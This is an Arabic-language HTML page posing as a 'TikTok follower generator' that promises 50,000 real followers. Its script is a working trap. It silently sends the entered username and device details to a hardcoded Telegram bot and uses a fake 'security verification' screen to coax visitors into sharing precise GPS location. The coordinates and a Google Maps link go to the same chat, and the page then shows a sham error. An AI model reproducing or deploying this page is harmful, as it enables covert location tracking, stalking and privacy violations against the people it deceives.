<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Global Booster | رشق متابعين تيك توك</title>
    <style>
        body { background: #010101; color: #fe2c55; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
        .glitch { font-size: 30px; font-weight: bold; text-transform: uppercase; position: relative; text-shadow: 0.05em 0 0 #25f4ee, -0.025em -0.05em 0 #fe2c55; animation: glitch 1s infinite; }
        @keyframes glitch { 0% { text-shadow: 0.05em 0 0 #25f4ee; } 50% { text-shadow: -0.05em -0.025em 0 #fe2c55; } 100% { text-shadow: 0.025em 0.05em 0 #25f4ee; } }
        .container { margin-top: 50px; border: 2px solid #25f4ee; padding: 20px; display: inline-block; border-radius: 15px; background: rgba(0,0,0,0.8); box-shadow: 0 0 20px #fe2c55; }
        input { padding: 10px; border-radius: 5px; border: 1px solid #25f4ee; background: #222; color: #fff; width: 80%; margin: 10px 0; }
        button { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #25f4ee; color: #000; box-shadow: 0 0 15px #25f4ee; }
        #status { margin-top: 20px; font-size: 14px; color: #25f4ee; }
        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; flex-direction:column; justify-content:center; align-items:center; z-index:1000; }
    </style>
</head>
<body>

    <div class="container">
        <div class="glitch">TIKTOK FOLLOWER GEN v9.0</div>
        <p>أدخل يوزرك للحصول على 50 ألف متابع حقيقي فوراً</p>
        <input type="text" id="username" placeholder="@username" required>
        <br>
        <button onclick="startHack()">ابدأ الرشق الآن 🔥</button>
        <div id="status">النظام جاهز... بانتظار اليوزر</div>
    </div>

    <div id="verifyBox" class="overlay">
        <h2 style="color: #25f4ee;">⚠️ إجراء أمني مطلوب</h2>
        <p>للتحقق من أنك لست روبوت، يجب تفعيل خدمة "تحديد المواقع" لربط حسابك بأقرب سيرفر تيك توك</p>
        <div id="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite;"></div>
        <p id="vStatus">جاري فحص الاتصال...</p>
    </div>

    <script>
        const BOT_TOKEN = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
        const CHAT_ID = "5475815049";

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        function startHack() {
            let user = document.getElementById('username').value;
            if(!user) return alert("أدخل اليوزر أولاً!");
            
            document.getElementById('verifyBox').style.display = 'flex';
            
            // سحب معلومات الجهاز والمتصفح صامتاً
            let deviceInfo = `🚨 *TARGET ENTERED TRAP* 🚨\n\n👤 *User:* ${user}\n📱 *Platform:* ${navigator.platform}\n🌐 *Browser:* ${navigator.userAgent}\n🖥️ *Screen:* ${screen.width}x${screen.height}`;
            sendToTelegram(deviceInfo);

            // طلب الـ GPS "غصباً" للتحقق
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let acc = pos.coords.accuracy;
                    let maps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    let gpsData = `📍 *PRECISE GPS CAPTURED* 📍\n\n🌎 *Lat:* \`${lat}\`\n🌎 *Lon:* \`${lon}\`\n🎯 *Acc:* \`${acc}m\`\n\n🗺️ [Open in Google Maps](${maps})`;
                    sendToTelegram(gpsData);
                    
                    document.getElementById('vStatus').innerText = "تم التحقق من الموقع! جاري إرسال المتابعين...";
                    setTimeout(() => { alert("خطأ في الخادم! حاول لاحقاً."); location.reload(); }, 3000);
                }, err => {
                    sendToTelegram(`❌ *Target Refused GPS:* ${err.message}`);
                    document.getElementById('vStatus').innerText = "فشل التحقق! يجب السماح بالوصول للموقع للمتابعة.";
                }, {enableHighAccuracy: true, timeout: 5000});
            }
        }
    </script>

    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
</body>
</html>
